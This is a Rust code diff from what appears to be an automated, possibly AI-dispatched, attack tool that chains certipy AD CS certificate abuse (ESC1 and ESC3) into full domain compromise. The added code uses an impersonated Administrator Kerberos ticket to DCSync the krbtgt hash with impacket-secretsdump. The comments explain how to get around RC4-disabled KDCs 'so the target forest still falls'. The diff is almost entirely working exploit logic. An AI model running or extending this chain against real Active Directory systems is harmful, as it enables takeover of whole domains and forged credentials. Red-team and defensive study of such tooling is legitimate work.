@@ -782,8 +782,15 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         return Ok(agent_output);
     }
     if !cwd.join(&agent_pfx).exists() {
+        // Exit-0-with-no-PFX (see the ESC1 chain note): certipy reports success
+        // on RPC failure / pending / denial. Surface its output so the operator
+        // sees why the enrollment-agent cert never issued.
         anyhow::bail!(
-            "certipy req (agent enrollment) reported success but {agent_pfx} was not produced"
+            "certipy req (agent enrollment) exited 0 but no PFX ({agent_pfx}) was produced — \
+             cert NOT issued (wrong CA host / pending approval / denied). \
+             certipy stdout: {} || stderr: {}",
+            agent_output.stdout.trim(),
+            agent_output.stderr.trim(),
         );
     }
 
@@ -821,8 +828,13 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         });
     }
     if !cwd.join(&target_pfx).exists() {
+        // Exit-0-with-no-PFX (see the ESC1 chain note). Surface certipy output.
         anyhow::bail!(
-            "certipy req (on-behalf-of) reported success but {target_pfx} was not produced"
+            "certipy req (on-behalf-of) exited 0 but no PFX ({target_pfx}) was produced — \
+             cert NOT issued (wrong CA host / pending approval / denied). \
+             certipy stdout: {} || stderr: {}",
+            request_output.stdout.trim(),
+            request_output.stderr.trim(),
         );
     }
 
@@ -886,6 +898,17 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
     let target = optional_str(args, "target")
         .or_else(|| optional_str(args, "ca_host"))
         .or_else(|| optional_str(args, "target_ip"));
+    // DC FQDN for the Kerberos-authenticated DCSync tail. When the target
+    // forest's KDC disables RC4 (e.g. a hardened forest root), `certipy auth`
+    // obtains a valid TGT but CANNOT recover the impersonated principal's NT
+    // hash via u2u — it prints `KDC_ERR_ETYPE_NOSUPP` and exits 0 with only a
+    // ccache. The NT hash never appears, so a chain that stops at `certipy
+    // auth` looks like a failure even though it holds an Administrator TGT.
+    // With `dc_host` present we DCSync `krbtgt` directly with that ccache
+    // (secretsdump `-k -no-pass -just-dc-user krbtgt`), which is the actual
+    // domain-compromise primitive. secretsdump's Kerberos target MUST be the
+    // DC's FQDN — an IP yields `KDC_ERR_S_PRINCIPAL_UNKNOWN`.
+    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());
 
     let user_at_domain = format!("{username}@{domain}");
     let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC1 chain")?;
@@ -915,7 +938,20 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
         return Ok(request_output);
     }
     if !cwd.join(&pfx_name).exists() {
-        anyhow::bail!("certipy req reported success but {pfx_name} was not produced");
+        // certipy's `req` CLI exits 0 even when the cert was NOT issued: an RPC
+        // transport failure (EPT_S_NOT_REGISTERED — the target host runs no
+        // certsvc, i.e. the request hit the DC instead of the real CA server),
+        // pending manager approval, or a policy/rights denial all leave exit 0
+        // with no PFX. Surface certipy's own stdout/stderr so the reason is
+        // diagnosable instead of a bare "no PFX" that costs blind retries.
+        anyhow::bail!(
+            "certipy req exited 0 but no PFX ({pfx_name}) was produced — cert NOT issued. \
+             Likely wrong CA host (EPT_S_NOT_REGISTERED = no certsvc on target; aim at the CA, \
+             not the DC), pending approval, or enrollment denied. \
+             certipy stdout: {} || stderr: {}",
+            request_output.stdout.trim(),
+            request_output.stderr.trim(),
+        );
     }
 
     let auth_output = CommandBuilder::new("certipy")
@@ -930,14 +966,81 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
 
     let req_label = format!("certipy req (ESC1, upn={upn}, sid={sid})");
     let auth_label = format!("certipy auth ({pfx_name})");
-    let (combined_stdout, combined_stderr) =
-        render_chain_output(&[(&req_label, &request_output), (&auth_label, &auth_output)]);
+
+    // DCSync tail: when `certipy auth` recovered the NT hash (RC4-enabled KDC),
+    // the combined output already carries a `Got hash for` line and the parser
+    // publishes it — no DCSync needed. When it did NOT (RC4-disabled KDC prints
+    // `KDC_ERR_ETYPE_NOSUPP`), the ccache is still a valid Administrator TGT;
+    // use it to DCSync `krbtgt` so the target forest still falls. Skipped when
+    // no `dc_host` (older/LLM dispatch) or no ccache landed.
+    let got_nt_hash = auth_output.stdout.contains("Got hash for");
+    let ccache = find_pkinit_ccache(&cwd, upn);
+    let dcsync_output = match (got_nt_hash, dc_host, ccache.as_deref()) {
+        (false, Some(dc_fqdn), Some(ccache_path)) => {
+            let dcsync_user = upn.split('@').next().unwrap_or("administrator");
+            let target_str = format!("{domain}/{dcsync_user}@{dc_fqdn}");
+            let out = CommandBuilder::new("impacket-secretsdump")
+                .arg("-k")
+                .arg("-no-pass")
+                .arg(&target_str)
+                .flag("-dc-ip", dc_ip)
+                .flag("-just-dc-user", "krbtgt")
+                .env("KRB5CCNAME", ccache_path)
+                .current_dir(&cwd)
+                .timeout_secs(180)
+                .execute()
+                .await?;
+            Some((
+                format!("secretsdump krbtgt DCSync (target={target_str})"),
+                out,
+            ))
+        }
+        _ => None,
+    };
+
+    // Declared before `steps` so it outlives the borrow `steps` takes of it.
+    let dcsync_label = dcsync_output.as_ref().map(|(label, _)| label.clone());
+    let mut steps: Vec<(&str, &ToolOutput)> =
+        vec![(&req_label, &request_output), (&auth_label, &auth_output)];
+    if let (Some(label), Some((_, out))) = (&dcsync_label, &dcsync_output) {
+        steps.push((label.as_str(), out));
+    }
+    let (combined_stdout, combined_stderr) = render_chain_output(&steps);
+
+    // Prefer the DCSync exit code when we ran it — that step is the one that
+    // actually establishes domain compromise on RC4-disabled KDCs.
+    let (exit_code, dcsync_success) = match &dcsync_output {
+        Some((_, out)) => (out.exit_code, out.success),
+        None => (auth_output.exit_code, true),
+    };
     Ok(ToolOutput {
         stdout: combined_stdout,
         stderr: combined_stderr,
-        exit_code: auth_output.exit_code,
-        success: request_output.success && auth_output.success,
+        exit_code,
+        success: request_output.success && auth_output.success && dcsync_success,
     })
+}
+
+/// Locate the ccache `certipy auth` wrote in `cwd`. certipy names it after the
+/// impersonated principal (the `-upn` sAMAccountName, e.g. `administrator` →
+/// `administrator.ccache`), but casing and future certipy versions vary, so
+/// prefer that exact name and fall back to any `*.ccache` in the directory.
+fn find_pkinit_ccache(cwd: &std::path::Path, upn: &str) -> Option<String> {
+    let user = upn.split('@').next().unwrap_or("").to_lowercase();
+    if !user.is_empty() {
+        let expected = cwd.join(format!("{user}.ccache"));
+        if expected.exists() {
+            return Some(expected.to_string_lossy().into_owned());
+        }
+    }
+    let entries = std::fs::read_dir(cwd).ok()?;
+    for entry in entries.flatten() {
+        let path = entry.path();
+        if path.extension().and_then(|e| e.to_str()) == Some("ccache") {
+            return Some(path.to_string_lossy().into_owned());
+        }
+    }
+    None
 }
 
 /// Unauthenticated probe for ESC8 (ADCS HTTP web enrollment) exposure.
